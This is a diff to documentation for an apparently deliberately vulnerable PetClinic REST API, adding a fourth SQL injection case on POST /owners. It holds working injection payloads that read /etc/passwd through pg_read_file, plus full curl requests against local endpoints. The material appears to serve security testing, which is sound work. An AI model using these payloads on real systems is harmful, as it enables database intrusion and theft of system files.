@@ -87,7 +87,7 @@ curl -i -s -k -X $'GET' \
 This vulnerability allows for inserting data, allowing an attacker to create
 a new user with, e.g., leaked data. 
 
-- operation: `createVet`
+- operation: `addVet`
 - payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
 ```json
 {
@@ -107,3 +107,32 @@ curl -i -s -k -X $'POST' \
     --data-binary $'{\x0a  \"firstName\": \"hack\', (SELECT LEFT(pg_read_file(\'/etc/passwd\'), 30)) ) RETURNING id--\",\x0a  \"lastName\": \"\",\x0a  \"specialties\": [\x0a    {\x0a      \"name\": \"hacker\"\x0a    }\x0a  ]\x0a}' \
     $'http://localhost:9966/petclinic/api/vets'
 ```
+
+## Endpoints with deeper execution paths
+These vulnerable endpoints deeper code path executions.
+
+[//]: # (all detect multiple rows as SQLi, so payloads work internally, but don't always return data in the HTTP response.)
+
+### Vulnerability 4: `POST /owners`
+This vulnerability is the same as [Vulnerability 3](#vulnerability-3-post-vets), but with a deeper code paths.
+This is achieved by splitting `vulnSave` into `vulnStoreNewOwner` and `vulnUpdateExistingOwner`.
+
+- operation: `addOwner`
+- payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
+```json
+{
+  "firstName": "hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)), 'addr', 'city', '42') RETURNING id--",
+  "lastName": "",
+  "address": "",
+  "city": "",
+  "telephone": ""
+}
+```
+
+```shell
+curl -i -s -k -X $'POST' \
+    -H $'Content-Type: application/json' -H $'Accept: application/json'-H $'Host: localhost:9966' -H $'Content-Length: 168' \
+    --data-binary $'{\x0d\x0a  \"firstName\": \"hack\', (SELECT LEFT(pg_read_file(\'/etc/passwd\'), 30)), \'addr\', \'city\', \'42\') RETURNING id--\",\x0d\x0a  \"lastName\": \"\",\x0d\x0a  \"address\": \"\",\x0d\x0a  \"city\": \"\",\x0d\x0a  \"telephone\": \"\"\x0d\x0a}\x0d\x0a' \
+    $'http://localhost:9966/petclinic/api/owners'
+```
+
